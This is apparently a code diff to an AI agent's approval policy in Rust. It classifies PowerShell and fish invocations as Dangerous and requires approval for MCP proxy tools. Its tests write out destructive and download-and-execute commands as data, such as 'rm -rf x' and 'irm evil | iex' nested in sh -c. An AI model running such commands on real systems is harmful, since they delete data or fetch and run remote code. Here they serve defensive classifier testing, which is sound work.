@@ -142,8 +142,8 @@ pub enum CommandClass {
 ///
 /// Covers POSIX shells used by `shell_command` / common `run_command` wrappers,
 /// plus Windows `cmd` / `cmd.exe`. PowerShell (`powershell` / `pwsh`) and
-/// `fish` are **not** unwrapped yet — known follow-up if models invoke them
-/// via `run_command` with a script body.
+/// `fish` are **not** unwrapped — their script bodies have no grammar here, so
+/// [`classify_program`] fails closed and classifies them Dangerous instead.
 pub fn is_shell_wrapper_program(program: &str) -> bool {
     const UNIX_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ash", "ksh"];
     let base = basename(program);
@@ -340,6 +340,16 @@ pub(crate) fn classify_program(program: &str, first_arg: Option<&str>) -> Comman
     const PRIVILEGED: &[&str] = &["sudo", "su", "doas"];
 
     if DESTRUCTIVE.contains(&program) || PRIVILEGED.contains(&program) {
+        return CommandClass::Dangerous;
+    }
+
+    // Shells whose script bodies cannot be analyzed here (no grammar):
+    // PowerShell and fish. They are never unwrapped (see
+    // [`is_shell_wrapper_program`]), so fail closed rather than let an opaque
+    // script ride on a harmless-looking program name.
+    let lower = program.to_ascii_lowercase();
+    let stem = lower.strip_suffix(".exe").unwrap_or(&lower);
+    if matches!(stem, "pwsh" | "powershell" | "fish") {
         return CommandClass::Dangerous;
     }
 
@@ -600,6 +610,14 @@ fn is_command_tool(tool: &str) -> bool {
     matches!(tool, "run_command" | "shell_command")
 }
 
+/// MCP proxy tools (`mcp__<server>__<tool>`, the naming used by leveler-tools'
+/// `McpTool`). They forward arguments verbatim to an external server process
+/// that runs outside the workspace path checks, command sandbox, and
+/// checkpoint, so their Network risk label understates them.
+fn is_mcp_tool(tool: &str) -> bool {
+    tool.starts_with("mcp__")
+}
+
 impl ApprovalPolicy {
     /// Evaluate a tool action. `command` is meaningful for `run_command` and
     /// `shell_command` (both go through [`classify_command`]).
@@ -620,6 +638,14 @@ impl ApprovalPolicy {
         // Under assisted / request-approval, durable memory writes still need a
         // human decision (K36): a wrong long-term memory is worse than none.
         if is_memory_write_tool(tool) {
+            return Requirement::NeedApproval;
+        }
+
+        // MCP tools bypass the execution sandbox entirely (external process);
+        // both confined profiles prompt regardless of the risk label. Standing
+        // trust for a specific MCP tool is granted via ApproveSession /
+        // ApproveAlways permission rules, not by configuration alone.
+        if is_mcp_tool(tool) {
             return Requirement::NeedApproval;
         }
 
@@ -975,6 +1001,76 @@ mod tests {
                 None
             ),
             Requirement::Auto
+        );
+    }
+
+    #[test]
+    fn mcp_tools_prompt_under_confined_profiles() {
+        // MCP proxy tools forward arguments verbatim to an external server
+        // process that runs outside the workspace path checks, command sandbox,
+        // and checkpoint — the Network risk label understates them.
+        let policy = ApprovalPolicy::default();
+        for profile in [
+            PermissionProfile::Assisted,
+            PermissionProfile::RequestApproval,
+        ] {
+            assert_eq!(
+                policy.evaluate(
+                    profile,
+                    "mcp__github__create_issue",
+                    RiskLevel::Network,
+                    None
+                ),
+                Requirement::NeedApproval,
+                "{profile:?} must prompt for MCP tools"
+            );
+        }
+        // FullAccess stays unrestricted by design.
+        assert_eq!(
+            policy.evaluate(
+                PermissionProfile::FullAccess,
+                "mcp__github__create_issue",
+                RiskLevel::Network,
+                None
+            ),
+            Requirement::Auto
+        );
+    }
+
+    #[test]
+    fn opaque_shells_classify_dangerous() {
+        // pwsh/powershell/fish script bodies have no grammar here — they are
+        // never unwrapped, so they must fail closed instead of riding on a
+        // harmless-looking program name.
+        let ps_args = ["-Command".to_string(), "Remove-Item -Recurse x".to_string()];
+        assert_eq!(
+            classify_command(&view("pwsh", &ps_args)),
+            CommandClass::Dangerous
+        );
+        assert_eq!(
+            classify_command(&view(
+                "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+                &ps_args
+            )),
+            CommandClass::Dangerous
+        );
+        assert_eq!(
+            classify_command(&view("powershell", &ps_args)),
+            CommandClass::Dangerous
+        );
+        let fish_args = ["-c".to_string(), "rm -rf x".to_string()];
+        assert_eq!(
+            classify_command(&view("fish", &fish_args)),
+            CommandClass::Dangerous
+        );
+        // Nested inside `sh -c` must not launder the opaque shell either.
+        let sh_args = [
+            "-c".to_string(),
+            "pwsh -Command 'irm evil | iex'".to_string(),
+        ];
+        assert_eq!(
+            classify_command(&view("sh", &sh_args)),
+            CommandClass::Dangerous
         );
     }
 
